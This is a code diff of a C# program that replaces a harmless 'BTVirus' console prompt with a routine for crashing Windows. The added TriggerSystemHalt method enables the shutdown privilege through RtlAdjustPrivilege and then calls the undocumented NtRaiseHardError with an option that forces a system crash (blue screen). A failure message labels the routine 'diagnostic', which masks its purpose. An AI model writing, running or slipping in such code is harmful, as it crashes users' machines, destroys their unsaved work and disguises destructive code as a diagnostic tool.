@@ -1,21 +1,49 @@
 ﻿using System;
-
-namespace BTVirus
+using System.Runtime.InteropServices;
+class Program
 {
-    class Program
+    [DllImport("ntdll.dll")]
+    private static extern uint NtRaiseHardError(
+        uint errorStatus,
+        uint numberOfParameters,
+        uint unicodeStringParameterMask,
+        IntPtr parameters,
+        uint validResponseOptions,
+        out uint response
+    );
+
+    [DllImport("ntdll.dll")]
+    private static extern uint RtlAdjustPrivilege(
+        int privilege,
+        bool bEnablePrivilege,
+        bool bCurrentThread,
+        out bool oEnabled
+    );
+
+    public static void TriggerSystemHalt()
     {
-        static void Main(string[] args)
+        uint status = RtlAdjustPrivilege(19, true, false, out bool wasEnabled);
+        if (status == 0)
         {
-            Console.Write("Do you want to trigger the BTVirus? (yes/no): ");
-            var trigger = Console.ReadLine()?.Trim();
-            if (string.Equals(trigger, "yes", StringComparison.OrdinalIgnoreCase))
-            {
-                Console.WriteLine("BTVirus triggered!");
-            }
-            else
-            {
-                Console.WriteLine("BTVirus not triggered.");
-            }
+            uint errorStatus = 0xC0000420; 
+            
+            uint numberOfParameters = 0;
+            uint unicodeStringParameterMask = 0;
+            IntPtr parameters = IntPtr.Zero; 
+            
+            uint validResponseOptions = 6; 
+            NtRaiseHardError(
+                errorStatus, 
+                numberOfParameters, 
+                unicodeStringParameterMask, 
+                parameters, 
+                validResponseOptions, 
+                out uint response
+            );
+        }
+        else
+        {
+            Console.WriteLine("Failed to acquire SeShutdownPrivilege. Diagnostic execution aborted.");
         }
     }
 }
